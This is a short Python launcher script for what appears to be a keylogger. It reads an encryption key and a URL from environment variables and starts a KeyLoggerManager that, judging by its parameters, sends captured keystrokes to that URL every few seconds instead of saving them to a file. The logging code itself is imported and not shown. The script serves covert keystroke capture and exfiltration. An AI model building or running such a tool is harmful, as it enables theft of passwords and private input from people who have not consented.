from os import getenv
from key_logger_manager import KeyLoggerManager
from dotenv import load_dotenv

load_dotenv()
encryption_key = getenv("encryption_key")
url = getenv('URL')

manager = KeyLoggerManager(5, encryption_key, url, write_to_file=False)

if __name__ == '__main__':
    manager.start()
